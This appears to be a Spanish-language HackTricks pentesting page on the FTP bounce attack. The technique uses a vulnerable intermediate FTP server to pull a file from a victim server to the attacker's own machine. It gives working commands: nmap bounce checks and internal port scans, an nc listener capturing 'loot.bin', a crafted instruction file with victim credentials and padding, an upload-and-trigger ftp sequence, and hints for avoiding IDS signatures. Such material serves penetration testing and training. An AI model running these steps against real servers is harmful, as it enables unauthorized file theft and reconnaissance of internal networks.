# FTP Bounce Descarga 2 de archivo FTP

{{#include ../../banners/hacktricks-training.md}}


## Resumen

Si tienes acceso a un **bounce FTP server**, puedes hacer que solicite archivos de **otro FTP server** (donde conoces algunas credenciales) y descargar ese archivo a **tu propio server**.

## Requisitos

- Credenciales válidas de FTP en el **FTP Middle server**
- Credenciales válidas de FTP en el **Victim FTP server**
- Ambos servers **accept the `PORT` command** (bounce FTP attack)
- Puedes **write** dentro de algún directorio del **FTP Middle server**
- El middle server tiene **more access** dentro del Victim FTP Server que tú

## Pasos

1. Conéctate al **your own FTP server** y pon la conexión en modo pasivo (`pasv` command) para que **listens** en un directorio donde el servicio víctima enviará el archivo.
2. Crea el archivo que el FTP Middle server enviará al Victim server (el **exploit script**). Este archivo será texto plano con los comandos necesarios para autenticarse contra el Victim server, cambiar el directorio y descargar un archivo a tu propio server.
3. Conéctate al **FTP Middle Server** y sube el archivo anterior.
4. Haz que el FTP Middle server **establish a connection** con el Victim server y envíe el archivo exploit.
5. **Capture** el archivo en tu propio FTP server.
6. **Delete** el archivo exploit del FTP Middle server.

## Comprobación rápida para bounce hosts vulnerables

- **Nmap** aún soporta comprobaciones de FTP bounce. Ejemplo para verificar un potencial middle server:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
Si el servidor rechaza valores `PORT` de terceros el escaneo fallará; algunos **dispositivos integrados/legacy —impresoras, NAS y demonios FTP de appliance—** aún lo permiten.

## Automatizando la 2ª descarga FTP

A continuación hay una forma modernizada de obtener un archivo a través de un servidor FTP intermedio vulnerable.

1. **Abre un listener en modo passive** en tu caja de ataque (cualquier TCP sink sirve):
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **Anota** tu IP como `A,B,C,D` y el puerto `P` como `p1,p2` (`p1 = P/256`, `p2 = P%256`).

3. **Construye el archivo de instrucciones** que el servidor intermedio reproducirá hacia la víctima:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Sube y dispara desde el servidor intermedio** (FTP proxy clásico):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Recupera el archivo** desde tu listener (`loot.bin`).
6. **Elimina** el archivo `instrs` subido en el servidor intermedio.

Notas:
- El padding (`dd ...`) evita que la conexión de control se cierre antes de que termine el RETR (problema de ventana TCP grande discutido en writeups clásicos).
- Cualquier servicio que pueda **listen and dump TCP** puede reemplazar el socket PASV de FTP (p. ej., `socat -u TCP-LISTEN:2121,fork - > loot.bin`).
- Si el servidor intermedio restringe puertos privilegiados, usa un puerto alto en `PORT` y ajusta tu listener en consecuencia.

## Trucos extra

- Usa un servidor FTP bounceable para **port-scan internal hosts** cuando el relevo de archivos esté bloqueado:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- Algunos WAF/IDS modernos (p. ej., Juniper IPS) incluyen firmas específicamente para **FTP:EXPLOIT:BOUNCE-ATTACK**; payloads ruidosos o padding ausente pueden activarlas.
- Cuando el servidor intermedio aplica la restricción "PORT to same host", coloca tu **listener en el propio servidor intermedio** (si tienes write/execute) y reenvía el archivo capturado después.

For a more detailed old-school walkthrough check: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## References

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
